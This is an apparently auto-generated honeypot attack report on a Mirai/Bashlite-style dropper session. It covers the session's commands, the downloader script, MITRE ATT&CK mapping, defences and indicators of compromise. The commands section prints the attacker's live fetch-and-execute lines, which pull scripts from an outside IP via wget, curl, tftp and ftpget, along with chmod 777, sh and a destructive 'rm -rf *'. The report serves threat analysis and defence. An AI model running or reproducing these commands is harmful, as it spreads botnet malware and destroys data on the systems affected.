# Attack Summary Report

## Details

The attack on the Linux honeypot involved the execution of a series of commands orchestrated to download and run malicious scripts and binaries from a remote server (IP: `193.222.96.26`). The scripts were designed to work across different system architectures, indicating the attacker's intention to target a wide range of victims. Each script downloaded an architecture-specific binary with the word "skid" in its name, along with an extension corresponding to the platform (e.g., `.x86`, `.mips`). The files were granted full permissions and subsequently executed. Post-execution, the files were removed to cover any trace of the initial infection vector.

## Methods

The key methods used in the attack include:

1. Changing to a writable directory to ensure successful download and execution of the malware.
2. Utilizing common Linux utilities (`wget`, `curl`) for redundancy in downloading the necessary malicious files.
3. Executing the downloaded scripts and binaries with the potential of spreading the infection or performing nefarious tasks.
4. Attempting to remove the evidence by deleting the downloaded and executed files from the system.

## Goals

Based on the observed behaviors and the malware characteristics, the goals of the attack likely include:

1. Establishing a foothold on the system by installing malware or backdoors for persistent access.
2. Possible inclusion of the compromised system into a botnet, either for coordinated attacks or other forms of cybercrime.
3. Potential theft of credentials and sensitive information.
4. Possible exploitation of the system's resources, for instance, through cryptocurrency mining.
5. System disruption or damage as a side effect or as a primary objective.

The attack, as analyzed, follows a multi-stage process with redundancy built into its operations, indicating an adversary's emphasis on ensuring success and survivability within the infected network. Armed with the captured IOCs, configured monitoring and defense systems can be updated to detect and prevent the propagation of this specific threat.

<h1>SSH Analysis</h1>
</summary>

The SSH data obtained in the context of the attack reveals the following information:

- The SSH fingerprint (hassh): `98f63c4d9c87edbd97ed4747fa031019`
- The SSH version used by the attacker: `SSH-2.0-Go`

The SSH fingerprint or hassh is a unique identifier representing the specific implementation and configuration of the SSH client used by the attacker. In this case, the attacker's SSH client has the fingerprint `98f63c4d9c87edbd97ed4747fa031019`.

The SSH version indicates that `SSH-2.0-Go` was used, which suggests that the attacker's SSH client was written in Go (Golang). This version information could potentially be used to identify and trace back the client software or to look for any known vulnerabilities associated with this specific client or its version.

# Commands Used
This attack used a total of `1` inputs to execute the following `15` commands:
The following unique commands were executed during the attack, along with their functions:

```sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
```
- This command tries to change the current directory to one of the listed directories: `/tmp`, `/var/run`, `/mnt`, `/root`, or the root directory `/`. The directories are attempted in order until one succeeds (`||` is a logical OR operator). These directories are chosen because they are commonly writable by users and services on a Linux system; `/tmp` is often used for temporary files.

```sh
wget http://193.222.96.26/z.sh
```
- Uses the `wget` utility to download a file named `z.sh` from a remote server with IP address `193.222.96.26`.

```sh
curl -O http://193.222.96.26/z.sh
```
- Similar to the above, this command uses `curl` to download the `z.sh` file. The `-O` flag tells `curl` to save the file with its original name.

```sh
chmod 777 z.sh
```
- Changes the file permission of `z.sh` to `777`, making it readable, writable, and executable by all users.

```sh
sh z.sh
```
- Executes the `z.sh` script using the `sh` shell.

```sh
tftp 193.222.96.26 -c get tz.sh
```
- Utilizes the TFTP (Trivial File Transfer Protocol) client to download a file named `tz.sh` from the same remote server.

```sh
chmod 777 tz.sh
```
- Alters the permission of the `tz.sh` file similar to `z.sh`.

```sh
sh tz.sh
```
- Runs the `tz.sh` script.

```sh
tftp -r tz2.sh -g 193.222.96.26
```
- Downloads `tz2.sh` from the server using TFTP.

```sh
chmod 777 tz2.sh
```
- Sets full permissions for `tz2.sh`.

```sh
sh tz2.sh
```
- Executes the `tz2.sh` script.

```sh
ftpget -v -u anonymous -p anonymous -P 21 193.222.96.26 z1.sh z1.sh
```
- Relies on `ftpget`, a utility often included in embedded devices with busybox, to anonymously download `z1.sh` from the FTP server running on port 21 at `193.222.96.26`.

```sh
sh z1.sh
```
- Executes the `z1.sh` script.

```sh
rm -rf z.sh tz.sh tz2.sh z1.sh
```
- Removes the downloaded scripts `z.sh`, `tz.sh`, `tz2.sh`, and `z1.sh`, preventing easy detection of the attack vector.

```sh
rm -rf *
```
- Removes all files in the current directory, which is destructive and could be part of covering tracks or disrupting the system.

In the context of the attack, these commands were used to download and execute multiple shell scripts from a remote server, likely for malicious purposes. The scripts `z.sh`, `tz.sh`, and `tz2.sh` were set to be fully executable and then run, which could involve deploying malware or performing other unauthorized activities. The use of `wget`, `curl`, `tftp`, and `ftpget` suggests redundancy to ensure the scripts are retrieved in case one method fails. The final commands aimed to remove the traces of these scripts, indicating an attempt to hide the evidence of the intrusion.

<h2>Commands Explained</h2>
</summary>

The following `15` commands were executed on the honeypot system:

```bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
```
The attacker attempts to **navigate to a writeable and/or unmonitored directory** to carry out further actions undetected. The `||` (logical OR) ensures that if one directory does not exist or the command fails, the next one will be attempted until a suitable directory is found.
```bash
wget http://193.222.96.26/z.sh
curl -O http://193.222.96.26/z.sh
chmod 777 z.sh
```
In an attempt to **download and execute a malicious script** (`z.sh`), the attacker first uses `wget` (a utility to download files from the web) to download the script from `http://193.222.96.26/z.sh`. If `wget` is not available or the command fails, `curl` (another utility to transfer data from or to a server) is used with the `-O` flag to download the same script. Once the file is on the machine, `chmod 777 z.sh` is used to make the script readable, writeable, and executable by anyone, and `sh z.sh` executes the script.
```bash
tftp 193.222.96.26 -c get tz.sh
chmod 777 tz.sh
```
Using **TFTP (Trivial File Transfer Protocol)**, the attacker retrieves another script (`tz.sh`) from the same server `193.222.96.26` and makes it fully accessible with `chmod 777`, before executing it with `sh tz.sh`. TFTP is used as an alternative download method if `wget` or `curl` are not successful or available.
```bash
tftp -r tz2.sh -g 193.222.96.26
chmod 777 tz2.sh
```
Again using **TFTP**, but with a different syntax to download a file, the attacker fetches `tz2.sh` from the same server. The script is made fully accessible with `chmod 777` and executed with `sh tz2.sh`.
```bash
ftpget -v -u anonymous -p anonymous -P 21 193.222.96.26 z1.sh z1.sh
```
The attacker resorts to using **FTP (File Transfer Protocol)** with the `ftpget` command to download another script (`z1.sh`) from the server, using anonymous credentials. Once the script is downloaded, it's executed with the command `sh z1.sh`.
```bash
rm -rf z.sh tz.sh tz2.sh z1.sh
```
The attacker then **removes the scripts** that were downloaded and executed (`z.sh`, `tz.sh`, `tz2.sh`, `z1.sh`) to cover their tracks and avoid detection of the source of the attack.
```bash
rm -rf *
```
In a drastic step to **remove all files** from the current directory (which may be any of the directories attempted in the first command), the attacker uses `rm -rf *`. This is typically a very destructive command and could potentially delete critical system files if executed in a sensitive directory like `/`.

**Hosts Found in Malware:** 193.222.96.26

**URLs Associated with Malware IPs:**
URLs serving payloads for malware known as bashlite and mirai. The payloads are tailored for different CPU architectures (e.g., MIPS, ARM, x86). The presence of the hostname 193.222.96.26 in the malware suggests it may be used for command and control or as a distribution point for secondary payloads.

Given the above information, the attack is associated with known malicious IPs with a history of distributing malware, especially those of the mirai and bashlite families. The malware detected in this attack is a Linx-based trojan that has been identified by various security vendors as malicious. It seems to be a part of a coordinated effort involving multiple systems, given the variety of payloads and architectures targeted.

The abuse reports, blocklist entries, and the commonality of attack patterns across both IPs and the downloaded malware suggest a organized effort likely aimed at exploiting vulnerabilities in Linux systems (due to it being a shell script), possibly to create a botnet or for other malicious objectives.

Since the malware analysis provides information about behaviors and antivirus signatures rather than specific malware family names not already identified through URLhaus, querying Malpedia with these behaviors or signatures won't provide additional relevant malware name information. If more specific malware names are identified in the future, those could then potentially be looked up on Malpedia for more detailed descriptions.

# Malware Analysis

The malware script with the SHA256 hash `713ca6a961a02c78b95decc18a01c69606d112c77ffc9f8629eb03ac39e7a22b` functions as follows in the context of the attack:

1. It first attempts to navigate to a writable directory by trying to change to `/tmp`, `/var/run`, `/mnt`, `/root`, or the root directory `/`. This ensures that the subsequent actions of the script have the required permissions to execute and that the malware binary can be written to disk.

2. The script attempts to download different architecture-specific binaries from the same source IP address `193.222.96.26`. Each binary is named `skid` with an architecture-specific extension like `.x86`, `.mips`, `.mpsl`, `.arm`, `.arm5`, `.ppc`, and `.hpc`, indicating that the malware is designed to be cross-platform and is capable of infecting multiple types of systems.

3. For each `skid` binary, the malware uses both `wget` and `curl` to download the binary. It then changes the permissions of the downloaded binary to `777` (readable, writable, and executable by anyone) using `chmod`.

4. Each binary is then executed with a command-line argument `ssh`, which might imply that the binary is related to SSH services or it is some form of SSH-based worm designed to spread over SSH connections.

5. After execution, the script removes the binary using the command `rm -rf`, indicating that the malware tries to cover its tracks and avoid easy detection by removing the executables.

The `mime_type` of the file is `text/plain`, with a total of `1301` bytes, which suggests it is likely a simple shell script used to automate the downloading and execution of these potentially malicious binaries.

This script serves as an initial payload that sets up the environment and retrieves the actual malware binaries that perform the attack on the system based on their architecture. The combined actions suggest a multi-stage infection process that aims to be stealthy and ensure compatibility with the targeted system's architecture.
This attack downloaded `1` raw malware samples which can be standardized into `1` samples:

The malware in question is a shell script designed for Linux systems. The script attempts to perform a series of actions to download and execute malicious payloads from a remote server across various directories that it has permission to access, catering to multiple system architectures (x86, MIPS, ARM, PowerPC, etc.). The payloads are named 'skid' with architecture-specific extensions and are hosted at a single IP address, suggesting that the attacker is targeting devices with different architectures, likely in a botnet or similar widespread attack.

Upon execution, the script attempts to use wget and curl to download the malicious binary for the system’s architecture. It then grants full permissions to the binary using chmod, executes it with 'ssh' as an argument (potentially to exploit or interact with SSH services), and finally attempts to remove the binary to hide its tracks. The malware exhibits worm-like behavior, aiming to spread across networks and devices while attempting to avoid detection by deleting itself after execution. The commands in the provided list correspond to this pattern, though they also include the use of TFTP and FTP to retrieve additional scripts, which could be other parts of the malware or additional payloads, and commands to remove traces of the malware.

# Which vulnerability does the attack attempt to exploit?
The provided commands do not indicate any specific vulnerabilities being directly exploited by name or CVE number. Instead, they reflect a set of actions designed to download and execute a script, `z.sh`, from the attacking host `193.222.96.26`.

Here is a step-by-step analysis of the actions taken:

1. Navigate between directories likely to be writable (`/tmp`, `/var/run`, `/mnt`, `/root`, `/`).
2. Download the `z.sh` script using `wget` and `curl`.
3. Make the downloaded script executable with `chmod 777`.
4. Execute the script with `sh`.
5. Attempt to download additional scripts (`tz.sh`, `tz2.sh`, `z1.sh`) using `tftp` and `ftpget`.
6. Execute these additional scripts.
7. Remove the scripts from the system.

These actions suggest that the attacker was trying to ensure that the malware was executed, without relying on any specific known vulnerability. Instead, this attack relies on the general misconfiguration or lack of security measures on the target system, like open writable directories or permissive firewall policies that allow protocols like TFTP and FTP without proper authentication.

To determine if known vulnerabilities were exploited, we would need more information about the system's state before the attack, like system logs or vulnerability scan reports, to identify any specific weaknesses the attacker might have targeted. Since the commands are focussed on downloading and executing, they do not provide direct evidence of any specific vulnerabilities being exploited.


# MITRE ATT&CK
The described attack can be classified using the MITRE ATT&CK framework as follows:

1. **Initial Access (TA0001)**:
    - **Exploit Public-Facing Application (T1190)**: If the attacker gained initial access through a vulnerable public-facing service, for example, by exploiting default credentials or known vulnerabilities.

2. **Execution (TA0002)**:
    - **Command and Scripting Interpreter (T1059)**: The attacker used shell scripts to execute malicious binaries, fitting the use of Unix shell command and scripting.
    - **User Execution (T1204)**: If the attacker relied on a user to run the scripts or binaries, this technique would apply.

3. **Persistence (TA0003)**:
    - **Create or Modify System Process (T1543)**: The malware seems to install binaries that could be designed to persist through reboots.

4. **Privilege Escalation (TA0004)**:
    - This might be applicable if the malware uses techniques to gain higher-level privileges, but there is not enough information on whether privilege escalation occurred.

5. **Defense Evasion (TA0005)**:
    - **File Deletion (T1107)**: The attacker attempted to remove the script files and binaries after execution to avoid detection.
    - **Obfuscated Files or Information (T1027)**: If any of the downloaded binaries or scripts were obfuscated.
  
6. **Credential Access (TA0006)**:
    - **Credentials from Password Stores (T1555)**: If the binaries were designed to steal SSH credentials or other logins.

7. **Discovery (TA0007)**:
    - **System Owner/User Discovery (T1033)**: The malware could be designed to identify the users on a system or other sensitive details.

8. **Lateral Movement (TA0008)**:
    - If the `ssh` argument for the binaries implies attempts to spread across networked systems using SSH, the malware might fit into the **Remote Services (T1021)** technique for SSH.

9. **Command and Control (TA0011)**:
    - **Application Layer Protocol (T1071)**: The binaries downloaded might communicate over network protocols such as HTTP or FTP to maintain command and control.

10. **Impact (TA0040)**:
    - **Inhibit System Recovery (T1490)**: Deleting files indiscriminately might affect system recovery.
    - **Resource Hijacking (T1496)**: If the malware hijacks system resources for profit, such as mining cryptocurrency.

With the information gathered, we can see aspects of the attack touching on several MITRE ATT&CK techniques, typically seen in multi-stage intrusion scenarios. More detailed investigation could further classify the attack or confirm additional techniques used.

# What Is The Goal Of The Attack?
Based on the behavior of the malware and the commands used in the attack, the goals could include several possibilities, often overlapping in the context of malicious campaigns:

1. **Installing Malware or Backdoors**: The use of various shell scripts to download and execute platform-specific binaries suggests the attacker's goal is to install malware on the compromised system. These could function as backdoors, giving the attacker persistent remote access.

2. **Establishing a Botnet**: The multiple architecture-dependent binaries (with .x86, .mips, .mpsl, etc., extensions) imply the attacker might be aiming to conscript the infected system into a botnet capable of launching other attacks, such as DDoS, spam distribution, or further malware propagation.

3. **Credential Theft**: By gaining access to a system, the attacker may attempt to harvest credentials to be used for lateral movement within the network or for compromising other systems, either within the same organization or elsewhere.

4. **Data Exfiltration**: The attacker could be seeking access to sensitive data stored on the compromised system or network, which could lead to data theft and breaches.

5. **Resource Exploitation**: If the malware carries payloads related to cryptocurrency mining or other resource-intensive tasks, the attacker might be looking to harness the computing resources of the infected system for profit.

6. **Espionage or Surveillance**: The attack could be aimed at establishing a foothold for long-term monitoring of system activities, user behavior, and data flows, potentially for espionage purposes.

7. **Sabotage or Destructive Purposes**: The indiscriminate deletion of files and altering of system configurations can be indicative of an attacker's intent to cause harm or disruption to organizational operations.

8. **Service Disruption**: The attack could also aim to disrupt services, either as an end in itself (e.g., for ransom demands, protest, or hactivism) or as a distraction from other stealthier malicious activities taking place.

The exact goal can vary and might encompass multiple objectives, which sometimes can only be fully understood in the context of a broader campaign. Further examination of the malware's behavior, attack telemetry, persistence mechanisms, and exfiltrated data (if any) would provide additional clarity on the attacker's intentions.

# If The System Is Vulnerable, Would The Attack Will Be Successful?
If the system targeted by the attack is vulnerable, the likelihood of the attack being successful increases significantly. Several factors would contribute to the system's vulnerability and the attack's potential success:

1. **Weak Credentials**: If the system is accessible via SSH or other remote services using default or weak credentials, it would be easier for an attacker to gain initial access and execute the malicious scripts.

2. **Misconfigured Services**: If services on the system are misconfigured in a way that allows unauthorized file downloads and executions, the scripts and binaries mentioned in the attack can be utilized effectively.

3. **Lack of Network Filtering**: In the absence of proper network filtering, the attacker could freely connect to the system from a remote location and download files, making it easy to deploy malware.

4. **Insufficient Monitoring**: Without effective monitoring and logging, malicious activities might go unnoticed, allowing the attacker to operate stealthily.

5. **Inadequate Malware Protection**: If the system lacks up-to-date antivirus or anti-malware tools, the downloaded binaries could be executed without being detected or blocked.

6. **Poor System Hardening**: Systems that are not hardened with security best practices are more susceptible to exploitation. Hardening includes the principle of least privilege, system updates and patches, and disabling unnecessary services.

If the attack exploits one or more of these vulnerabilities, it has a high probability of succeeding, especially given the observed attack behavior which includes redundancy in downloading mechanisms (both `wget` and `curl`, with `tftp` and `ftpget` as backups) and the use of different architecture-specific binaries to ensure execution. Any unpatched known vulnerabilities in the services or applications running on the system would exacerbate this risk.

Therefore, to prevent such attacks, it's essential to maintain strong security practices such as using secure passwords, regularly updating systems and software, implementing proper network defenses, monitoring for unusual activity, and adhering to the principle of least privilege for system access. These measures would greatly diminish the chances of this and similar attacks from succeeding.

# How Can A System Be Protected From This Attack?
To protect a system from the described attack and similar threats, a combination of preventative measures, best practices in system management, and security policies should be implemented:

### Good Credential Hygiene
- **Use Strong Passwords**: Ensure that all accounts, especially those with remote access capabilities, have strong, unique passwords that are not easy to guess or brute-force.
- **Multi-Factor Authentication (MFA)**: Where possible, implement MFA to add an additional layer of security for user accounts.
  
### System Hardening
- **Regular Updates**: Apply security patches and updates regularly to close known vulnerabilities in the operating system and installed software.
- **Configuration Management**: Configure services correctly to minimize security gaps. Disable unnecessary services, ports, and protocols.
- **Principle of Least Privilege**: Limit user and process privileges to the minimum necessary for the required functioning. This limits the potential impact of a breach.
- **Security Policies**: Enforce security policies that require regular password changes and audit users' permissions regularly.

### Network Security
- **Firewalls**: Configure firewalls to block incoming traffic to unnecessary ports and to restrict outbound traffic to minimize command and control capabilities of malware.
- **Intrusion Detection Systems (IDS)/Intrusion Prevention Systems (IPS)**: Use IDS/IPS to detect and possibly prevent exploitation activities or malware communication.

### Monitoring and Logging
- **Monitoring Solutions**: Implement solutions for monitoring the integrity of critical system files and directories.
- **Log Management**: Enable and review logs for unusual activity that could indicate an attack.

### Endpoint Protection
- **Anti-Malware Software**: Use reputable antivirus or anti-malware solutions with real-time scanning and regular updates to detect and quarantine malicious files.
- **Application Allowlisting**: Use allowlisting tools to prevent the execution of unauthorized software on systems.

### Employee Awareness and Training
- **Security Awareness**: Train staff in recognizing phishing attempts and the importance of following security procedures.
- **Testing and Drills**: Perform regular security assessment, penetration testing, and incident response drills.

### Response Plan
- **Incident Response Plan**: Have an incident response plan in place that includes steps to isolate infected systems, remove malware, restore from backups, and notify affected parties if necessary.

By employing these protective measures, a system's attack surface can be significantly reduced, and the ability to detect, respond to, and recover from attacks will be enhanced. It's essential to maintain a proactive security stance with constant evaluation and improvement to adapt to evolving threats.

# What Are The Indicators Of Compromise (Iocs) For This Attack?

### Behavioral IOCs:
- Commands indicating the download and execution of remote shell scripts and binaries.
- Use of `wget`, `curl`, `tftp`, and `ftpget` to download files, which is unusual in a typical system's operational behavior.
- Commands granting full permissions (`chmod 777`) to downloaded files.
- Files being deleted after execution (`rm -rf` commands).

Security teams can use these IOCs to search within their networks for related activity. For instance, they can check firewall, proxy, and antivirus logs for the IOCs, look for the specific hash values on file systems, and monitor for the execution of suspicious commands that match these patterns. Institutions with network monitoring or security incident and event management (SIEM) systems can configure their tools with these IOCs to alert on related activities actively.
